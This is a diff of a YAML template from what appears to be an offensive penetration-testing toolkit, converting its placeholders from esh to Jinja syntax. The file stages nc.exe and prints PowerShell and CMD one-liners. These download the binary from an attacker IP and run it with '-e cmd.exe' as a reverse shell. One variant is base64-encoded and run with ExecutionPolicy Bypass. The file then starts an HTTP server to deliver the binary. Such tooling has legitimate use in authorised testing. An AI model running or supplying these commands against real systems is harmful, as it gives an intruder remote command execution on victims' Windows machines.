@@ -1,20 +1,28 @@
----
 metadata:
-  filename: "deliver-windows-revshell-nc.exe.yaml"
-  tags: ["shell", "windows"]
-  created: "2025-03-29"
-  author: "Unknown"
-
-content: |
-  mkdir -p packstation/outbound; cp -n /usr/share/windows-resources/binaries/nc.exe packstation/outbound; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver only: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/nc.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\nc.exe'; \
-  echo 'Deliver + RevShell: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/nc.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\nc.exe; <%=$(esh variables/delivery_path_windows)%>\nc.exe -e cmd.exe <%=$(esh variables/attacker_ip)%> <%=$(esh variables/shell_port)%>'; \
-  echo '================================================================'; \
-  echo '                         -----CMD-----                          '; \
-  echo 'Deliver only: powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/nc.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\nc.exe'; \
-  echo 'Deliver + RevShell: powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/nc.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\nc.exe; <%=$(esh variables/delivery_path_windows)%>\nc.exe -e cmd.exe <%=$(esh variables/attacker_ip)%> <%=$(esh variables/shell_port)%>'; \
-  echo 'Deliver + RevShell (encoded): powershell.exe -ExecutionPolicy Bypass -EncodedCommand <%="powershell wget -uri http://"$(esh variables/attacker_ip)":"$(esh variables/delivery_outbound_port)"/nc.exe -Outfile "$(esh variables/delivery_path_windows)"\nc.exe; "$(esh variables/delivery_path_windows)"\nc.exe -e cmd.exe "$(esh variables/attacker_ip)" "$(esh variables/shell_port) | python helper_scripts/encode.py --base64pwsh %>'; \
-  echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  filename: deliver-windows-revshell-nc.exe.yaml
+  tags:
+  - shell
+  - windows
+  created: '2025-03-29'
+  author: Unknown
+content: "{% raw %}mkdir -p packstation/outbound; cp -n /usr/share/windows-resources/binaries/nc.exe\
+  \ packstation/outbound; \\\necho '================================================================';\
+  \ \\\necho '                      -----PowerShell-----                      '; \\\
+  \necho 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
+  \ }}/nc.exe -Outfile {{ delivery_path_windows }}\\nc.exe'; \\\necho 'Deliver + RevShell:\
+  \ iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/nc.exe -Outfile\
+  \ {{ delivery_path_windows }}\\nc.exe; {{ delivery_path_windows }}\\nc.exe -e cmd.exe\
+  \ {{ attacker_ip }} {{ shell_port }}'; \\\necho '================================================================';\
+  \ \\\necho '                         -----CMD-----                          '; \\\
+  \necho 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
+  \ }}/nc.exe -Outfile {{ delivery_path_windows }}\\nc.exe'; \\\necho 'Deliver + RevShell:\
+  \ powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/nc.exe\
+  \ -Outfile {{ delivery_path_windows }}\\nc.exe; {{ delivery_path_windows }}\\nc.exe\
+  \ -e cmd.exe {{ attacker_ip }} {{ shell_port }}'; \\\necho 'Deliver + RevShell (encoded):\
+  \ powershell.exe -ExecutionPolicy Bypass -EncodedCommand {{ \"powershell wget -uri\
+  \ http://\"$(esh variables/attacker_ip)\":\"$(esh variables/delivery_outbound_port)\"\
+  /nc.exe -outfile \"$(esh variables/delivery_path_windows)\"\\nc.exe; \"$(esh variables/delivery_path_windows)\"\
+  \\nc.exe -e cmd.exe \"$(esh variables/attacker_ip)\" \"$(esh variables/shell_port)\
+  \ | python helper_scripts/encode.py --base64pwsh }}'; \\\necho '================================================================';\
+  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
+  \ delivery_outbound_port }} -d packstation/outbound\n{% endraw %}"
